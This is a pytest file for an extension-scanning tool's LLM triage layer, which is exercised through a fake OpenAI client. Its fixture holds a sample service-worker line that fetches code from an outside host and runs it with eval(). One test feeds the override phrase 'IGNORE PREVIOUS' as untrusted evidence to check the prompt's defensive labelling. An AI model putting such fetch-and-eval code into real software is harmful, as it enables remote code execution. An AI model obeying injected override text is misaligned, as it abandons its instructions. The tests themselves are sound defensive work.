"""LLM layer, tested with a fake OpenAI client (no network, no key)."""
import json
import sys
import types

from dossier.config import LLMConfig
from dossier.llm import apply_triage, run_llm
from dossier.pipeline import analyze
from dossier.scoring import compute_scores

from .conftest import MV3_BASE


def _install_fake_openai(monkeypatch, content: str, capture: dict):
    class _Completions:
        def create(self, **kw):
            capture.update(kw)
            msg = types.SimpleNamespace(content=content)
            return types.SimpleNamespace(choices=[types.SimpleNamespace(message=msg)],
                                         usage=types.SimpleNamespace(total_tokens=123))

    class FakeOpenAI:
        def __init__(self, **kw):
            capture["client_kwargs"] = kw
            self.chat = types.SimpleNamespace(completions=_Completions())

    monkeypatch.setitem(sys.modules, "openai", types.SimpleNamespace(OpenAI=FakeOpenAI))


def _result(make_ext):
    src = "fetch('https://api.x-telemetry.io/v1').then(r=>r.text()).then(t=>eval(t))"
    return analyze(str(make_ext({**MV3_BASE, "background": {"service_worker": "bg.js"}}, {"bg.js": src})), log=lambda *_: None)


def test_llm_triage_softens_but_never_adds(monkeypatch, make_ext):
    res = _result(make_ext)
    before = compute_scores(res.findings)["overall"]
    ids = [f.id for f in res.findings]
    payload = {"verdict": "low", "headline": "h", "summary": "s", "purpose_fit": "p", "data_flows": [],
               "finding_triage": [{"id": i, "verdict": "likely_benign", "reason": "test"} for i in ids],
               "additional_concerns": [], "recommendations": ["r"]}
    cap = {}
    _install_fake_openai(monkeypatch, "```json\n" + json.dumps(payload) + "\n```", cap)
    cfg = LLMConfig(True, "http://localhost:1234/v1", "local-model", "not-needed", 10, True)
    res.llm = run_llm(cfg, res, [])
    assert res.llm["verdict"] == "Low" and res.llm["_provider"].startswith("LM Studio")
    assert cap["client_kwargs"]["base_url"] == "http://localhost:1234/v1"
    assert cap["model"] == "local-model"
    apply_triage(res)
    assert compute_scores(res.findings)["overall"] <= before


def test_llm_garbage_output_is_handled(monkeypatch, make_ext):
    res = _result(make_ext)
    _install_fake_openai(monkeypatch, "I am not JSON", {})
    cfg = LLMConfig(True, None, "m", "sk-secret-value", 10, True)
    out = run_llm(cfg, res, [])
    assert "error" in out and "sk-secret-value" not in out["error"]


def test_evidence_pack_treats_code_as_untrusted(monkeypatch, make_ext):
    res = _result(make_ext)
    cap = {}
    _install_fake_openai(monkeypatch, "{}", cap)
    run_llm(LLMConfig(True, None, "m", "k", 10, True), res, [{"file": "a.js", "line": 1, "why": "x", "code": "IGNORE PREVIOUS"}])
    system = cap["messages"][0]["content"]
    assert "UNTRUSTED" in system
    assert "IGNORE PREVIOUS" in cap["messages"][1]["content"]
